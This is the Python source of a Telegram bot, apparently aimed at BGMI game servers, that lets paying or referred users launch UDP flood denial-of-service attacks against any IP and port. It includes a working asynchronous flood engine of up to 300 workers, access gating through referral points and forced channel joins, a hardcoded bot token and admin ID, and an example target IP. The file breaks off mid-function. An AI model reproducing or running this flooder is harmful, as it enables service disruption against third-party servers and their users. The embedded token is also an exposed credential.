#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  🔥 BGMI ULTIMATE ATTACK BOT v3 🔥
#  Premium Effects | Referral | Button Menu | Force Sub | Status
#  Pure Python UDP Engine (No Binary) - Termux + VPS
# ============================================================

import os
import sys
import json
import time
import socket
import asyncio
import datetime
import logging
import random
import subprocess

# ---------- AUTO-INSTALL MODULES ----------
try:
    from aiogram import Bot, Dispatcher, F, BaseMiddleware
    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.filters import Command, CommandStart
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
    from aiogram.enums import ChatAction, ChatMemberStatus
except ImportError:
    print("[+] Installing aiogram...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "aiogram"])
    from aiogram import Bot, Dispatcher, F, BaseMiddleware
    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.filters import Command, CommandStart
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
    from aiogram.enums import ChatAction, ChatMemberStatus

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("BGMI-BOT")

# ============================================================
#  ⚙️ CONFIG - YAHAN SET KARO
# ============================================================
API_TOKEN = '8630786145:AAGfioLyM6LAdxcLB9f0eiqdyMi2Ysyl09I'
ADMIN_IDS = [7766306643]                    # Admin Telegram IDs

# 🔒 2 FORCE SUB CHANNELS (bot ko dono me admin banao)
FORCE_CHANNELS = [
    {"chat": "@YOUR_CHANNEL_1", "link": "https://t.me/a4lxe", "name": "Channel 1"},
    {"chat": "@YOUR_CHANNEL_2", "link": "https://t.me/+wMfqbKHZ9b8xMGU9", "name": "Channel 2"},
]
# Private channel hai to "@username" ki jagah numeric chat id (ex: -1001234567890) daalo

# 🎁 Referral settings
POINTS_PER_REF    = 100   # points per referral
POINTS_FOR_HOUR   = 500   # 500 points = 1 hour
REDEEM_HOURS      = 1     # hours given on redeem
BONUS_POINTS_NEW_USER = 50  # signup bonus

# ⚔️ Attack limits
COOLDOWN      = 200     # sec between attacks per user
MAX_THREADS   = 300
MAX_DURATION  = 600

AUTH_FILE = "authorized_users.json"
POINTS_FILE = "points.json"
STATS_FILE = "stats.json"

# ============================================================
#  🎆 PREMIUM EMOJI IDs (message effects)
# ============================================================
PREMIUM_EMOJIS = [
    "6100639476441161711","6102462664288509137","6100199534351097095",
    "6102926404792360795","6100409966273764915","6100430105375415737",
    "6102470558438400435","6100451820730064687","6102638599033858630",
    "6100179369479642954","6100485115316542792","6102661242101440205",
    "6102592514034770678","6102475626499808862","6102863908723236868",
    "6102510630483271620","6282589525348720171","6055377380204092112",
    "6055551219005398825","6055181976371994390","6055481009175010794",
    "6055484548228062462","6055202102588742236","6055450347403484860",
    "6055228576767155521","6055183995006623379","6337009415278828759",
    "6336756235546663929","6334772471757020134","6336732269629153634",
    "6336833407519038409","6337048276142924106","6337018975876030803",
    "6336608132189395373","6336797785060286399","6336685231147326793",
    "6336907611669011898","6336988189550451848","6337098578799893838",
    "6336808092981796477","6337020083977592163","6337112997005107243",
    "6337051755066433311","6336835907190004485","6336618976981818626",
    "6336857218817728795","6336974471424908889","6337125748763008448",
    "6337098338281725706","6336962978092425393","6336633214798404108",
    "6337019139084786234","6337035356881296575","6337026908680625329",
    "6336690569791676356","6337106906741480828","6337072645787361389",
    "6336720729052027967","6336670885956557643","6337113894653271580",
    "6334488003188105980","6336721798498884548","6336799284003873851",
    "6337112129421713282","6336599202952388231","6336755629956275338",
    "6334702021408465964","6337109865973948062","6336708763273142215",
    "6337083451925078342","6336930400765484501","6334788126912815244",
    "6337059606266651217","6336812005697002754","6336813629194640485",
    "6337085796977221633","6336663202260065128","6334324468013341494",
    "6337047855236129713","6336782885818742144","6336664645369076808",
    "6336910583786383660","6336862179504954500","6336697226990985005",
    "6336772620846899242","6337033209397649451","6336861449360514102",
    "6336573617832206335","6337055242579876765","6336789422758960593",
    "6336781331040577785","6336603218746810844","6337123072998383823",
    "6336894825551371014","6334681658968513467","6336799919659031563",
    "6336707603631972035","6336874467406389346","6336756411640323933",
    "6336608037700115865","6336613247495445753","6336973539417007164",
    "6336931040715612818","6336653869296132233","6336836572909938734",
    "6336798231736885254","6336813951317187443","6336866435817545002",
    "6336662845777780692","6336580455420141312","6336750437340816001",
    "6336677470141422007","6337078718871117522","6336931345658289868",
    "6336935322798005307","6336646834139700626","6337010179783007229",
    "6336618208182673162","6336580975111184057","6336957184181543528",
    "6336991256157101601","6336655355354815762","6336795865209904645",
    "6337054177427988529","6336855354801921798","6336878444546105899",
    "6336861037043654967","6336662472115626382","6337093386184432717",
    "6336637947852365586","6336876696494417749","6334678278829252492",
    "6337087411884923105","6336989731443711607","6336882614959349480",
    "6336886055228153516","6336797591786757523","6336674519498890396",
    "6336856849450540332","6337048379222138619","6336816932024491505",
    "6336672814396874442","6336835035311644293","6336668004033504924",
    "6336682357814205676","6336764563488252026","6337100812182887680",
    "6336575056646249129"
]

# ============================================================
#  GLOBALS
# ============================================================
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
BOT_USERNAME = ""

AUTHORIZED_USERS = {}   # uid -> {"authorized_until": datetime}
POINTS = {}             # uid -> points
REFERRED_BY = {}        # uid -> referrer uid
LAST_ATTACK_TIME = {}
ATTACK = {"running": False, "stop_event": None, "workers": None,
          "anim_msg": None, "info": None}
START_TIME = time.time()
STATS = {"total_attacks": 0, "packets": 0, "total_points": 0}

class AttackState(StatesGroup):    waiting_args = State()
class BroadcastState(StatesGroup): waiting_text = State()
class AddUserState(StatesGroup):   waiting_input = State()
class RemoveUserState(StatesGroup):waiting_input = State()
class UpdateUserState(StatesGroup):waiting_input = State()

# ============================================================
#  ✨ HELPERS
# ============================================================

def P(text: str) -> str:   # Premium style text (𝘼𝘽𝘾)
    out = []
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:
            out.append(chr(0x1D63C + o - 65))
        elif 97 <= o <= 122:
            out.append(chr(0x1D656 + o - 97))
        elif 48 <= o <= 57:
            out.append(chr(0x1D7EC + o - 48))
        else:
            out.append(ch)
    return "".join(out)

async def send_msg(chat_id, text, reply_markup=None, effect=True):
    """Send with random premium emoji effect (auto-fallback if unsupported)."""
    kwargs = {"chat_id": chat_id, "text": text, "reply_markup": reply_markup}
    if effect and PREMIUM_EMOJIS:
        try:
            return await bot.send_message(**kwargs, message_effect_id=random.choice(PREMIUM_EMOJIS))
        except Exception:
            pass
    return await bot.send_message(**kwargs)

async def edit_msg(msg, text):
    try:
        await msg.edit_text(text)
    except Exception:
        pass

async def typing(chat_id, seconds=1.2):
    end = time.time() + seconds
    while time.time() < end:
        try:
            await bot.send_chat_action(chat_id, action=ChatAction.TYPING)
        except Exception:
            pass
        await asyncio.sleep(1.2)

def progress_bar(pct, width=16):
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)

def fmt_uptime(sec):
    d, rem = divmod(int(sec), 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    if d: return f"{d}d {h}h {m}m"
    if h: return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"

def is_admin(uid):
    return uid in ADMIN_IDS

# ---------- FILE STORAGE ----------
def load_all():
    global AUTHORIZED_USERS, POINTS, REFERRED_BY, STATS
    try:
        with open(AUTH_FILE) as f:
            data = json.load(f)
        for uid, udata in data.items():
            if isinstance(udata, dict) and "authorized_until" in udata:
                AUTHORIZED_USERS[int(uid)] = {
                    "authorized_until": datetime.datetime.fromtimestamp(udata["authorized_until"])}
    except Exception:
        pass
    try:
        with open(POINTS_FILE) as f:
            data = json.load(f)
        POINTS = {int(k): v for k, v in data.get("points", {}).items()}
        REFERRED_BY = {int(k): int(v) for k, v in data.get("referred_by", {}).items()}
    except Exception:
        pass
    try:
        with open(STATS_FILE) as f:
            STATS = json.load(f)
    except Exception:
        STATS = {"total_attacks": 0, "packets": 0, "total_points": 0}

def save_authorized_users():
    with open(AUTH_FILE, "w") as f:
        json.dump({str(uid): {"authorized_until": ud["authorized_until"].timestamp()}
                   for uid, ud in AUTHORIZED_USERS.items()}, f, indent=2)

def save_points():
    with open(POINTS_FILE, "w") as f:
        json.dump({"points": POINTS, "referred_by": REFERRED_BY}, f, indent=2)

def save_stats():
    with open(STATS_FILE, "w") as f:
        json.dump(STATS, f, indent=2)

def save_all():
    save_authorized_users(); save_points(); save_stats()

def ensure_registered(uid):
    global STATS
    if uid not in POINTS:
        POINTS[uid] = BONUS_POINTS_NEW_USER
        STATS["total_points"] += BONUS_POINTS_NEW_USER
        save_points(); save_stats()

async def check_authorization(user_id):
    if user_id not in AUTHORIZED_USERS:
        return False
    ud = AUTHORIZED_USERS[user_id]
    if ud["authorized_until"] < datetime.datetime.now():
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        return False
    return True

# ---------- FORCE SUB ----------
async def is_force_sub_ok(user_id) -> bool:
    if user_id in ADMIN_IDS:
        return True
    for ch in FORCE_CHANNELS:
        try:
            m = await bot.get_chat_member(ch["chat"], user_id)
            if m.status in (ChatMemberStatus.LEFT, ChatMemberStatus.KICKED):
                return False
        except Exception:
            return False
    return True

def join_kb():
    rows = [[InlineKeyboardButton(text=f"📢 {ch['name']}", url=ch["link"])]
            for ch in FORCE_CHANNELS]
    rows.append([InlineKeyboardButton(text="✅ I've Joined", callback_data="check_sub")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

class ForceSubMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if not isinstance(event, (Message, CallbackQuery)) or not getattr(event, "from_user", None):
            return await handler(event, data)
        if isinstance(event, CallbackQuery) and event.data == "check_sub":
            return await handler(event, data)
        if isinstance(event, Message) and event.text and event.text.startswith("/start"):
            return await handler(event, data)
        uid = event.from_user.id
        if uid in ADMIN_IDS or await is_force_sub_ok(uid):
            return await handler(event, data)
        txt = "⚠️ " + P("You must join our channels to use the bot!")
        if isinstance(event, Message):
            await send_msg(event.chat.id, txt, reply_markup=join_kb())
        else:
            await event.answer()
            await send_msg(event.message.chat.id, txt, reply_markup=join_kb())
        return

# ============================================================
#  ⚔️ ATTACK ENGINE (Pure Python UDP)
# ============================================================
async def flood_worker(idx, ip, port, stop_event, counts):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    addr = (ip, port)
    payloads = [os.urandom(256) for _ in range(4)]
    i = 0
    try:
        while not stop_event.is_set():
            try:
                sock.sendto(payloads[i & 3], addr)
                counts[idx] += 1
            except BlockingIOError:
                await asyncio.sleep(0.0005)
            except OSError:
                break
            i += 1
            if i % 64 == 0:
                await asyncio.sleep(0)
    finally:
        sock.close()

async def run_attack(chat_id, ip, port, duration, threads, anim):
    stop_event = asyncio.Event()
    ATTACK.update(stop_event=stop_event, running=True, info={"ip": ip, "port": port})
    counts = [0] * threads
    workers = [asyncio.create_task(flood_worker(i, ip, port, stop_event, counts))
               for i in range(threads)]
    ATTACK["workers"] = workers
    ATTACK["anim_msg"] = anim
    start = time.time()
    try:
        while not stop_event.is_set():
            elapsed = time.time() - start
            if elapsed >= duration:
                break
            pct = min(100, int(elapsed / duration * 100))
            rem = max(0, int(duration - elapsed))
            packets = sum(counts)
            txt = (f"🚀 {P('Attack Running')}\n\n"
                   f"🎯 {P('IP')}: {ip}\n🏖️ {P('Port')}: {port}\n"
                   f"⏳ {P('Remaining')}: {rem}s | 📦 {packets:,} {P('packets')}\n\n"
                   f"{progress_bar(pct)} {pct}%")
            await edit_msg(anim, txt)
            await asyncio.sleep(1)
    finally:
        stopped = stop_event.is_set()
        stop_event.set()
        await asyncio.gather(*workers, return_exceptions=True)
        total = sum(counts)
        STATS["packets"] += total
        save_stats()
        ATTACK.update(running=False, workers=None, stop_event=None,
                      anim_msg=None, info=None)
    return stopped, total

async def perform_attack(chat_id, uid, ip, port, duration, threads):
    LAST_ATTACK_TIME[uid] = time.time()
    STATS["total_attacks"] += 1
    save_stats()
    await typing(chat_id, 1.2)
    anim = await send_msg(chat_id, f"🚀 {P('Launching Attack')}...")
    await asyncio.sleep(0.5)
    await edit_msg(anim, f"🚀⚡ {P('Sending Packets')}...")
    await asyncio.sleep(0.5)
    await edit_msg(anim, f"🚀⚡💥 {P('Attack Started')} 🎯 {ip}:{port}")
    stopped, total = await run_attack(chat_id, ip, port, duration, threads, anim)
    if stopped:
        await send_msg(chat_id, "🛑 " + P("Attack Stopped By User!"))
    else:
        await send_msg(chat_id, f"✅ {P('Attack Completed')} 🎊\n"
                                f"🎯 {ip}:{port}\n⏱️ {duration}s\n"
                                f"📦 {total:,} {P('packets sent')}")

# ============================================================
#  🔘 MAIN MENU
# ============================================================
def main_menu_kb(uid):
    rows = [
        [InlineKeyboardButton(text="🚀 Attack", callback_data="attack")],
        [InlineKeyboardButton(text="🛑 Stop Attack", callback_data="stop")],
        [InlineKeyboardButton(text="👤 User Info", callback_data="userinfo"),
         InlineKeyboardButton(text="🎁 Referral", callback_data="referral")],
        [InlineKeyboardButton(text="📊 Bot Status", callback_data="status")],
    ]
    if is_admin(uid):
        rows += [
            [InlineKeyboardButton(text="📢 Broadcast", callback_data="broadcast")],
            [InlineKeyboardButton(text="➕ Add User", callback_data="adduser"),
             InlineKeyboardButton(text="➖ Remove User", callback_data="removeuser")],
            [InlineKeyboardButton(text="🔄 Update User", callback_data="updateuser"),
             InlineKeyboardButton(text="📋 List Users", callback_data="listuser")],
            [InlineKeyboardButton(text="🔄 Restart Bot", callback_data="restart")],
        ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def show_menu(chat_id, uid, edit=False, msg=None):
    txt = (f"🏠 {P('Main Menu')}\n\n"
           f"🔥 {P('Welcome to BGMI Attack Bot')} 🚀\n"
           f"👆 {P('Use the buttons below')}")
    kb = main_menu_kb(uid)
    if edit and msg:
        await edit_msg(msg, txt)
        try:
            await msg.edit_reply_markup(reply_markup=kb)
        except Exception:
            pass
    else:
        await send_msg(chat_id, txt, reply_markup=kb)

# ============================================================
#  📥 COMMANDS
# ============================================================
@dp.message(CommandStart())
async def cmd_start(message: Message):
    global STATS
    uid = message.from_user.id
    payload = ""
    parts = message.text.split()
    if len(parts) > 1:
        payload = parts[1]

    if uid not in POINTS:   # new user
        POINTS[uid] = BONUS_POINTS_NEW_USER
        STATS["total_points"] += BONUS_POINTS_NEW_USER
        if payload.startswith("ref_"):
            try:
                ref_id = int(payload[4:])
            except ValueError:
                ref_id = None
            if ref_id and ref_id != uid and ref_id in POINTS:
                REFERRED_BY[uid] = ref_id
                POINTS[ref_id] = POINTS.get(ref_id, 0) + POINTS_PER_REF
                STATS["total_points"] += POINTS_PER_REF
                save_points(); save_stats()
                try:
                    await send_msg(ref_id, f"🎉 {P('New referral joined')}! "
                                           f"+{POINTS_PER_REF} {P('points')} 🪙\n"
                                           f"{P('Your points')}: {POINTS[ref_id]}")
                except Exception:
                    pass
        save_points(); save_stats()

    if not await is_force_sub_ok(uid):
        await send_msg(message.chat.id,
                       f"⚠️ {P('Join our channels to unlock the bot')}! 👇",
                       reply_markup=join_kb())
        return
    await show_menu(message.chat.id, uid)

@dp.message(Command("menu"))
async def cmd_menu(message: Message):
    ensure_registered(message.from_user.id)
    await show_menu(message.chat.id, message.from_user.id)

@dp.message(Command("bgmi"))
async def cmd_bgmi(message: Message):
    uid = message.from_user.id
    if not await check_authorization(uid):
        await send_msg(message.chat.id, P("⛔ Access Denied! You are not authorized. DM @xchumt."))
        return
    if ATTACK["running"]:
        await send_msg(message.chat.id, P("⚠️ An attack is already running! Press /stop first."))
        return
    args = message.text.split()[1:]
    if len(args) != 4:
        await send_msg(message.chat.id,
                       P("🤦 Usage: /bgmi <ip> <port> <time_sec> <threads>") + "\n\n" +
                       P("Example: /bgmi 20.235.94.237 17870 180 180"))
        return
    try:
        ip, port, duration, threads = args[0], int(args[1]), int(args[2]), int(args[3])
    except ValueError:
        await send_msg(message.chat.id, P("❌ Port/time/threads must be numbers!"))
        return
    if not (1 <= port <= 65535) or not (5 <= duration <= MAX_DURATION) or not (1 <= threads <= MAX_THREADS):
        await send_msg(message.chat.id, P(f"❌ Limits: port 1-65535 | time 5-{MAX_DURATION} | threads 1-{MAX_THREADS}"))
        return
    now = time.time()
    if uid in LAST_ATTACK_TIME and now - LAST_ATTACK_TIME[uid] < COOLDOWN:
        wait = COOLDOWN - int(now - LAST_ATTACK_TIME[uid])
        await send_msg(message.chat.id, P(f"⏳ Wait {wait} seconds before another attack!"))
        return
    await perform_attack(message.chat.id, uid, ip, port, duration, threads)

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    if ATTACK["running"] and ATTACK["stop_event"]:
        ATTACK["stop_event"].set()
        if ATTACK["anim_msg"]:
            await edit_msg(ATTACK["anim_msg"], "🛑 " + P("Stopping Attack") + "...")
        await send_msg(message.chat.id, "🛑 " + P("Attack Stopped!"))
    else:
        await send_msg(message.chat.id, P("⚠️ No attack is currently running."))

@dp.message(Command("status"))
async def cmd_status(message: Message):
    await show_status(message.chat.id)

@dp.message(Command("referral"))
async def cmd_referral(message: Message):
    ensure_registered(message.from_user.id)
    await show_referral(message.chat.id, message.from_user.id)

@dp.message(Command("redeem"))
async def cmd_redeem(message: Message):
    await do_redeem(message.chat.id, message.from_user.id)

@dp.message(Command("userinfo"))
async def cmd_userinfo(message: Message):
    await show_userinfo(message.chat.id, message.from_user.id)

# ============================================================
#  🎁 REFERRAL
# ============================================================
async def show_referral(chat_id, uid):
    pts = POINTS.get(uid, 0)
    refs = sum(1 for r in REFERRED_BY.values() if r == uid)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
    txt = (f"🎁 {P('Referral Program')}\n\n"
           f"🪙 {P('Your Points')}: {pts}\n"
           f"👥 {P('Referrals')}: {refs}\n\n"
           f"💸 +{POINTS_PER_REF} {P('points per referral')}\n"
           f"⏰ {POINTS_FOR_HOUR} {P('points')} = {REDEEM_HOURS} {P('hour of access')}\n\n"
           f"🔗 {P('Your Link')}:\n{link}\n\n"
           f"{P('Share the link - jab koi join karega, points milenge')}!")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🪙 Redeem {POINTS_FOR_HOUR} → {REDEEM_HOURS}hr", callback_data="redeem")],
        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")],
    ])
    await send_msg(chat_id, txt, reply_markup=kb)

async def do_redeem(chat_id, uid):
    pts = POINTS.get(uid, 0)
    if pts < POINTS_FOR_HOUR:
        await send_msg(chat_id, P(f"❌ You need {POINTS_FOR_HOUR} points! You have {pts}."))
        return
    POINTS[uid] -= POINTS_FOR_HOUR
    now = datetime.datetime.now()
    if uid in AUTHORIZED_USERS and AUTHORIZED_USERS[uid]["authorized_until"] > now:
        AUTHORIZED_USERS[uid]["authorized_until"] += datetime.timedelta(hours=REDEEM_HOURS)
    else:
        AUTHORIZED_USERS[uid] = {"authorized_until": now + datetime.timedelta(hours=REDEEM_HOURS)}
    save_points(); save_authorized_users()
    exp = AUTHORIZED_USERS[uid]["authorized_until"].strftime("%Y-%m-%d %H:%M:%S")
    await send_msg(chat_id, f"🎉 {P('Redeemed Successfully')}!\n"
                            f"🪙 {P('Points left')}: {POINTS[uid]}\n"
                            f"⏳ {P('Access until')}: {exp}")

# ============================================================
#  📊 STATUS / USER INFO
# ============================================================
async def show_status(chat_id):
    uptime = time.time() - START_TIME
    running = ATTACK["running"]
    info = ATTACK["info"] or {}
    txt = (f"🤖 {P('Bot Status')}\n\n"
           f"🟢 {P('Status')}: {P('Online')}\n"
           f"⏱ {P('Uptime')}: {fmt_uptime(uptime)}\n"
           f"⚔️ {P('Total Attacks')}: {STATS['total_attacks']}\n"
           f"📦 {P('Packets Sent')}: {STATS['packets']:,}\n"
           f"🎯 {P('Attack Running')}: {'🔥 Yes' if running else '❌ No'}\n"
           f"🎯 {P('Target')}: {info.get('ip', '-')}:{info.get('port', '-')}\n"
           f"👥 {P('Authorized Users')}: {len(AUTHORIZED_USERS)}\n"
           f"🪙 {P('Total Points Awarded')}: {STATS['total_points']}\n"
           f"⏳ {P('Cooldown')}: {COOLDOWN}s | 🧵 {P('Max Threads')}: {MAX_THREADS}")
    if HAS_PSUTIL:
        txt += f"\n💻 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%"
    txt += "\n\n🔒 " + P("Force Sub") + ": ✅ " + P("Active")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
    await send_msg(chat_id, txt, reply_markup=kb)

async def show_userinfo(chat_id, uid):
    ud = AUTHORIZED_USERS.get(uid)
    if ud and ud["authorized_until"] > datetime.datetime.now():
        expiry = ud["authorized_until"].strftime("%Y-%m-%d %H:%M:%S")
    else:
        expiry = P("Oops Not Approved! Contact @xchumt")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
    await send_msg(chat_id,
                   f"🔖 {P('Role')}: {P('User')}\n"
                   f"🆔 {P('User ID')}: {uid}\n"
                   f"👤 {P('Username')}: @{uid}\n"
                   f"🪙 {P('Points')}: {POINTS.get(uid, 0)}\n"
                   f"⏳ {P('Approval / Expiry')}: {expiry}",
                   reply_markup=kb)

# ============================================================
#  🔘 CALLBACKS (BUTTONS)
# ============================================================
@dp.callback_query(F.data == "menu")
async def cb_menu(cq: CallbackQuery):
    ensure_registered(cq.from_user.id)
    await show_menu(cq.message.chat.id, cq.from_user.id, edit=True, msg=cq.message)
    await cq.answer()

@dp.callback_query(F.data == "check_sub")
async def cb_check_sub(cq: CallbackQuery):
    if await is_force_sub_ok(cq.from_user.id):
        ensure_registered(cq.from_user.id)
        await cq.answer("✅ Access granted!")
        await show_menu(cq.message.chat.id, cq.from_user.id, edit=True, msg=cq.message)
    else:
        await cq.answer("❌ You are still not a member!", show_alert=True)

@dp.callback_query(F.data == "cancel")
async def cb_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await cq.answer("❌ Cancelled!")
    try:
        await cq.message.delete()
    except Exception:
        pass

@dp.callback_query(F.data == "attack")
async def cb_attack(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not await check_authorization(uid):
        await cq.answer(P("⛔ Not authorized! DM @xchumt"), show_alert=True)
        return
    if ATTACK["running"]:
        await cq.answer(P("⚠️ Attack already running! Use Stop first."), show_alert=True)
        return
    now = time.time()
    if uid in LAST_ATTACK_TIME and now - LAST_ATTACK_TIME[uid] < COOLDOWN:
        wait = COOLDOWN - int(now - LAST_ATTACK_TIME[uid])
        await cq.answer(P(f"⏳ Wait {wait}s before another attack!"), show_alert=True)
        return
    await state.set_state(AttackState.waiting_args)
    await cq.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
    await send_msg(cq.message.chat.id,
                   f"🎯 {P('Send attack details')}:\n\n"
                   f"<ip> <port> <time_sec> <threads>\n\n"
                   f"{P('Example')}: 20.235.94.237 17870 180 180",
                   reply_markup=kb)

@dp.message(AttackState.waiting_args, F.text)
async def handle_attack_args(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    if not await check_authorization(uid):
        await send_msg(message.chat.id, P("⛔ Not authorized!"))
        return
    if ATTACK["running"]:
        await send_msg(message.chat.id, P("⚠️ Attack already running!"))
        return
    args = message.text.split()
    if len(args) != 4:
        await send_msg(message.chat.id, P("❌ Invalid format! Send: <ip> <port> <time> <threads>"))
        return
    try:
        ip, port, duration, threads = args[0], int(args[1]), int(args[2]), int(args[3])
    except ValueError:
        await send_msg(message.chat.id, P("❌ Port/time/threads must be numbers!"))
        return
    if not (1 <= port <= 65535) or not (5 <= duration <= MAX_DURATION) or not (1 <= threads <= MAX_THREADS):
        await send_msg(message.chat.id, P(f"❌ Limits: port 1-65535 | time 5-{MAX_DURATION} | threads 1-{MAX_THREADS}"))
        return
    await perform_attack(message.chat.id, uid, ip, port, duration, threads)

@dp.callback_query(F.data == "stop")
async def cb_stop(cq: CallbackQuery):
    if ATTACK["running"] and ATTACK["stop_event"]:
        ATTACK["stop_event"].set()
        if ATTACK["anim_msg"]:
            await edit_msg(ATTACK["anim_msg"], "🛑 " + P("Stopping..."))
        await cq.answer("🛑 Attack Stopped!", show_alert=True)
    else:
        await cq.answer(P("⚠️ No attack running!"), show_alert=True)

@dp.callback_query(F.data == "userinfo")
async def cb_userinfo(cq: CallbackQuery):
    ensure_registered(cq.from_user.id)
    await cq.answer()
    await show_userinfo(cq.message.chat.id, cq.from_user.id)

@dp.callback_query(F.data == "referral")
async def cb_referral(cq: CallbackQuery):
    ensure_registered(cq.from_user.id)
    await cq.answer()
    await show_referral(cq.message.chat.id, cq.from_user.id)

@dp.callback_query(F.data == "redeem")
async def cb_redeem(cq: CallbackQuery):
    ensure_registered(cq.from_user.id)
    await cq.answer()
    await do_redeem(cq.message.chat.id, cq.from_user.id)

@dp.callback_query(F.data == "status")
async def cb_status(cq: CallbackQuery):
    await cq.answer()
    await show_status(cq.message.chat.id)

# ---------- ADMIN CALLBACKS ----------
@dp.callback_query(F.data == "broadcast")
async def cb_broadcast(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
        return
    await state.set_state(BroadcastState.waiting_text)
    await cq.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
    await send_msg(cq.message.chat.id, f"📢 {P('Send the broadcast message')}:", reply_markup=kb)

@dp.message(BroadcastState.waiting_text, F.text)
async def handle_broadcast_text(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    sent = failed = 0
    for uid in list(POINTS.keys()):
        try:
            await send_msg(uid, message.text)
            sent += 1
        except Exception:
            failed += 1
    await send_msg(message.chat.id, f"✅ {P('Broadcast sent')}: {sent} ✅ | {failed} ❌")

@dp.callback_query(F.data == "adduser")
async def cb_adduser(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
        return
    await state.set_state(AddUserState.waiting_input)
    await cq.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
    await send_msg(cq.message.chat.id, f"➕ {P('Send')}: <user_id> <minutes>", reply_markup=kb)

@dp.message(AddUserState.waiting_input, F.text)
async def handle_adduser_text(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await send_msg(message.chat.id, P("Usage: <user_id> <minutes>"))
        return
    try:
        uid, mins = int(args[0]), int(args[1])
    except ValueError:
        await send_msg(message.chat.id, P("❌ Invalid numbers!"))
        return
    AUTHORIZED_USERS[uid] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=mins)}
    save_authorized_users()
    await send_msg(message.chat.id, P(f"✅ User {uid} added! ({mins} minutes access)"))

@dp.callback_query(F.data == "removeuser")
async def cb_removeuser(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
        return
    await state.set_state(RemoveUserState.waiting_input)
    await cq.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
    await send_msg(cq.message.chat.id, f"➖ {P('Send user_id to remove')}:", reply_markup=kb)

@dp.message(RemoveUserState.waiting_input, F.text)
async def handle_removeuser_text(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    try:
        uid = int(message.text.strip())
    except ValueError:
        await send_msg(message.chat.id, P("❌ Invalid user_id!"))
        return
    if uid in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[uid]
        save_authorized_users()
        await send_msg(message.chat.id, P(f"✅ User {uid} removed."))
    else:
        await send_msg(message.chat.id, P(f"❌ User {uid} not found."))

@dp.callback_query(F.data == "updateuser")
async def cb_updateuser(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
        return
    await state.set_state(UpdateUserState.waiting_input)
    await cq.answer()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
    await send_msg(cq.message.chat.id, f"🔄 {P('Send')}: <user_id> <new_minutes>", reply_markup=kb)

@dp.message(UpdateUserState.waiting_input, F.text)
async def handle_updateuser_text(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await send_msg(message.chat.id, P("Usage: <user_id> <new_minutes>"))
        return
    try:
        uid, mins = int(args[0]), int(args[1])
    except ValueError:
        await send_msg(message.chat.id, P("❌ Invalid numbers!"))
        return
    if uid in AUTHORIZED_USERS:
        AUTHORIZED_USERS[uid]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=mins)
        save_authorized_users()
        await send_msg(message.chat.id, P(f"✅ User {uid} updated! ({mins} minutes)"))
    else:
        await send_msg(message.chat.id, P(f"❌ User {uid} not found."))

@dp.callback_query(F.data == "listuser")
async def cb_listuser(cq: CallbackQuery):
    if not is_admin(cq.from_user.id):
        await cq.answer(P("⛔ Admin only!"), show_alert=True)
